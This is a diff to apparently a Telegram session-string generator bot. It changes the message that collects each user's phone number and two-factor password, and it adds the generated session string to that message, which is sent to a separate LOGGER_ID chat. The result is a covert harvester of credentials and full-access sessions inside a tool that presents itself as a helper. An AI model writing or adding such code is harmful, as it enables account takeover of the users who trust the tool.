@@ -104,7 +104,7 @@ async def gen_session(
     if await cancelled(phone_number):
         return
     phone_number = phone_number.text
-    xxx = f"» 𝖯𝗁𝗈𝗇𝖾 𝖭𝗎𝗆𝖻𝖾𝗋 : {phone_number}\n\n"
+    xxx = f"**» 𝖯𝗁𝗈𝗇𝖾 𝖭𝗎𝗆𝖻𝖾𝗋 :** {phone_number}\n\n"
     await xemishra.send_message(user_id, "» 𝖳𝗋𝗒𝗂𝗇𝗀 𝖳𝗈 𝖲𝖾𝗇𝖽 𝖮𝖳𝖯 𝖠𝗍 𝖳𝗁𝖾 𝖦𝗂𝗏𝖾𝗇 𝖭𝗎𝗆𝖻𝖾𝗋...")
     if telethon:
         client = TelegramClient(StringSession(), api_id, api_hash)
@@ -187,7 +187,7 @@ async def gen_session(
         if await cancelled(pwd):
             return
         pwd = pwd.text
-        xxx += f"» Password : {pwd}"
+        xxx += f"**» Password :** {pwd}\n\n"
         try:
             if telethon:
                 await client.sign_in(password=pwd)
@@ -223,6 +223,7 @@ async def gen_session(
         pass
     try:
         await client.disconnect()
+        xxx += f"**» 𝖲𝖤𝖲𝖲𝖨𝖮𝖭 :** `{string_session}`"
         await xemishra.send_message(LOGGER_ID, xxx)
         await xemishra.send_message(
             chat_id=user_id,
